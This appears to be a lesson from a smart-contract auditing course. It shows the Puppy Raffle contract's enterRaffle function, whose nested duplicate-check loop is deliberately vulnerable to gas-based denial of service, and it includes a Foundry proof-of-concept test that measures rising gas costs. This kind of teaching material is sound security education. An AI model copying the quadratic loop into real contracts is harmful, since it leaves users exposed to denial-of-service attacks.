---
title: DoS - PoC (Proof of Code)
---

_Follow along with this video:_

---

### Back to Puppy Raffle

Now that we possess a little more context and understanding of what a `Denial of Service` attack is, and what it can mean for a protocol, let's return to Puppy Raffle and remind ourselves where we began.

```js
/// @notice this is how players enter the raffle
/// @notice they have to pay the entrance fee * the number of players
/// @notice duplicate entrants are not allowed
/// @param newPlayers the list of players to enter the raffle
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }

    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

This should look very familiar to us by now:

```js
// Check for duplicates
// @audit Possible DoS
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

At this point I would add this to my `notes.md`, you may want to come back to this later and continue assessing the code back, but let's go ahead and prove this finding now.

### Proof of Code

If the protocol has an existing test suite, it's often easier to add our tests to it than write things from scratch.

Run `forge test` to make sure the test suite is working correctly so far!

There are lots of useful parts of `PuppyRaffle.t.sol` we can use for our PoC.

Now, here's your challenge. I want you to try and write the `Proof of Code` yourself. Build those skills by trying to write a test function that shows the potential `Denial of Service` we've uncovered.

<details>
<summary> The Proof of Code </summary>

Great! Now that you've _100%_ tried this yourself, let's go through it together.

I would start by harvesting the existing `testCanEnterRaffle` function. This is a great boilerplate for what we're trying to show.

```js
function testCanEnterRaffle() public {
    address[] memory players = new address[](1);
    players[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    assertEq(puppyRaffle.players(0), playerOne);
}
```

Let's repurpose this!

```js
function testDenialOfService() public {
    // Foundry lets us set a gas price
    vm.txGasPrice(1);

    // Creates 100 addresses
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for(uint i = 0; i < players.length; i++){
        players[i] = address(i);
    }

    // Gas calculations for first 100 players
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    uint256 gasEnd = gasleft();
    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost of the first 100 players: ", gasUsedFirst);
}
```

Running the command `forge test --mt testDenialOfService -vvv` should give us an output like this:

![dos-poc1](/security-section-4/13-dos-poc/dos-poc1.png)

Now let's do the same thing for the second 100 players! We'll need to add something like this to our test.

```js
// Creates another array of 100 players
address[] memory playersTwo = new address[](playersNum);
for (uint256 i = 0; i < playersTwo.length; i++) {
    playersTwo[i] = address(i + playersNum);
}

// Gas calculations for second 100 players
uint256 gasStartTwo = gasleft();
puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
uint256 gasEndTwo = gasleft();
uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
console.log("Gas cost of the second 100 players: ", gasUsedSecond);

assert(gasUsedFirst < gasUsedSecond);
```

If we rerun our test we can see.. Our test passes! The second 100 players are paying _a LOT_ more and are at a significant disadvantage!

![dos-poc2](/security-section-4/13-dos-poc/dos-poc2.png)

</details>


### Wrap Up

That's all there is to it. We've clearly shown a potential `Denial of Service` through our `Proof of Code`. This test function is going to go right into our report.

Let's do that now!
